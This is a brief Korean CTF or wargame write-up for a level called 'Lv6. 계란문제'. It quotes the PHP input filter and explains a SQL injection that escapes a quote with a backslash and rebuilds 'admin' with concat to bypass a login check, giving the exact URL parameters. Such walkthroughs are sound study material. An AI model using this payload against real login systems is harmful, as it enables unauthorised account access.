<img width="160" alt="스크린샷 2020-01-10 오후 5 55 31" src="https://user-images.githubusercontent.com/54495632/72139841-b91c2680-33d2-11ea-9e19-a254e16f87df.png">

Lv6. 계란문제

<img width="585" alt="스크린샷 2020-01-10 오후 5 55 42" src="https://user-images.githubusercontent.com/54495632/72139855-bf120780-33d2-11ea-86a1-0585514e6b2d.png">
<img width="662" alt="스크린샷 2020-01-10 오후 5 56 16" src="https://user-images.githubusercontent.com/54495632/72139866-c2a58e80-33d2-11ea-9092-b8a1f959c6fe.png">

그전 문제에서 필터링 조건이 붙은 것 같다.
if(preg_match('/play|_|\.|\(|\)|info/i', $id)){ exit("Nope !!");}
if(preg_match('/play|_|\.|\(|\)|info/i', $pw)){ exit("Nope !!");}
if(preg_match('/#|;|-/i', $id)){ exit("Query is filtered :( ");}
if(preg_match('/#|;|-/i', $pw)){ exit("Query is filtered :( ");}

#주석처리, -- 주석처리 ; 등이 사용 불가능한 것 같다.

앞 서 이용했던 escape문자 \와 concat 을 활용하기로 했다.

select id from play_sql06 where id='\' and pw=sha1('||id=concat('ad','min')

쿼리 자체는 다음과 같은 쿼리를 사용했고

URL 은 sha1('') 에 의해 닫히므로 id=\&pw=||id=concat(%27ad%27,%27min

마지막 부분에서 ') 는 생략해주었다.

다음과 같이 URL을 입력하게 되면 id 가 \' and pw=sha1( 로 인식이 되어 pw 에서의

sha1 함수를 피할 수 있게 된다.

이 다음 id 에 admin 을 주어야 하는데 sha1 함수에서 마지막 ') 부분이 남으므로

온전히 id = 'admin' 의 구조는 이용할 수 없어 괄호와 작은 따옴표를 이용하면서 admin 값을 넘길 수 

있는 방법을 생각해, concat 함수로 || id = concat( 'ad','min 과 같이 우회하였다.

<img width="483" alt="스크린샷 2020-01-10 오후 6 13 01" src="https://user-images.githubusercontent.com/54495632/72141150-a3f4c700-33d5-11ea-900b-29e09db8fd48.png">

<img width="834" alt="스크린샷 2020-01-10 오후 6 13 06" src="https://user-images.githubusercontent.com/54495632/72141154-a5be8a80-33d5-11ea-97d5-449fab24817c.png">